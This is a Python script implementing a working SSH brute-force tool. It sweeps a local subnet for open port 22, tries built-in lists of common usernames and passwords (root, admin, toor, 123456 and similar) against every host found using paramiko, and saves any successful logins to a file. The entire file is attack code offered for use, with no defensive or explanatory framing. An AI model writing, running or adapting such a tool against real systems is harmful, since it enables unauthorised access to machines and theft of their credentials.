import paramiko
import socket
import time
import threading
from concurrent.futures import ThreadPoolExecutor
import os

class SSHBruteforce:
    def __init__(self):
        self.found_creds = []
    
    def load_wordlist(self, path="wordlist.txt"):
        if not os.path.exists(path):
            default_users = ['root', 'admin', 'user', 'ubuntu', 'debian', 'pi', 'kali']
            default_pass = ['password', '123456', 'root', 'admin', 'toor', 'Password1']
            with open(path, 'w') as f:
                for u in default_users:
                    f.write(f"{u}\n")
                for p in default_pass:
                    f.write(f"{p}\n")
            return default_users, default_pass
        else:
            with open(path, 'r') as f:
                lines = f.readlines()
                return [l.strip() for l in lines], [l.strip() for l in lines]
    
    def check_ssh(self, ip, port=22):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def scan_network(self, subnet="192.168.1.0/24"):
        import ipaddress
        hosts = []
        network = ipaddress.ip_network(subnet, strict=False)
        for host in network.hosts():
            ip = str(host)
            if self.check_ssh(ip):
                hosts.append(ip)
        return hosts
    
    def brute_force(self, ip, username, password, port=22):
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port=port, username=username, password=password, timeout=3)
            cred = f"{username}:{password}@{ip}:{port}"
            self.found_creds.append(cred)
            client.close()
            return True
        except:
            return False
    
    def start_attack(self, target_ips=None, wordlist_path="wordlist.txt"):
        users, passwords = self.load_wordlist(wordlist_path)
        if not target_ips:
            target_ips = self.scan_network()
        
        for ip in target_ips:
            for user in users:
                for pwd in passwords[:50]:
                    self.brute_force(ip, user, pwd)
        
        result = f"Found {len(self.found_creds)} credentials:\n" + "\n".join(self.found_creds)
        with open("found_creds.txt", 'w') as f:
            f.write(result)
        return result